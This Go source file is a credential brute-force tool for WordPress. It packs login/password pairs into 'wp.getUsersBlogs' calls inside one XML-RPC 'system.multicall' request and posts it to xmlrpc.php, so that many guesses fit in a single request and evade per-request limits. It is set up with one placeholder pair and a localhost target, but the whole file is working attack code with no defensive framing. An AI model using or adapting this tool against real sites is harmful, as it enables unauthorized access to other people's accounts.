package main

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"net/http"
	"text/template"
)

type Credentials struct {
	Login    string
	Password string
}

func main() {
	payload_line, err := GenXMLCredentialLine("COOKIE", "CAKE")
	if err != nil {
		log.Fatal(err)
	}

	payload_lines := []string{payload_line}
	payload := GenXMLPayload(payload_lines)

	body, err := Request("http://localhost:8080/xmlrpc.php", payload)
	if err != nil {
		log.Fatal(err)
	}

	fmt.Printf("%v\n", body)
}

func Request(url string, payload string) (string, error) {
	req, err := http.NewRequest("POST", url, bytes.NewBufferString(payload))
	if err != nil {
		return "", fmt.Errorf("Failed to create request: %w", err)
	}

	req.Header.Set("Content-Type", "application/xml")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("Failed to execute request: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("Failed to read response body: %w", err)
	}

	return string(body), nil
}

func GenXMLCredentialLine(login string, password string) (string, error) {
	template_string := "<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>{{.Login}}</string></value><value><string>{{.Password}}</string></value></data></array></value></data></array></value></member></struct></value>"
	var buf bytes.Buffer

	credentials := Credentials{login, password}

	template, err := template.New("xml_temlate").Parse(template_string)
	if err != nil {
		return "", fmt.Errorf("Failed to parse xml template: %w", err)
	}

	err = template.Execute(&buf, credentials)
	if err != nil {
		return "", fmt.Errorf("Failed to execute xml template: %w", err)
	}

	return buf.String(), nil
}

func GenXMLPayload(credential_line []string) string {
	payload_head := "<?xml version='1.0'?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>"
	payload_tail := "</data></array></value></param></params></methodCall>"
	payload_body := ""
	for _, line := range credential_line {
		payload_body += line
	}

	return payload_head + payload_body + payload_tail
}
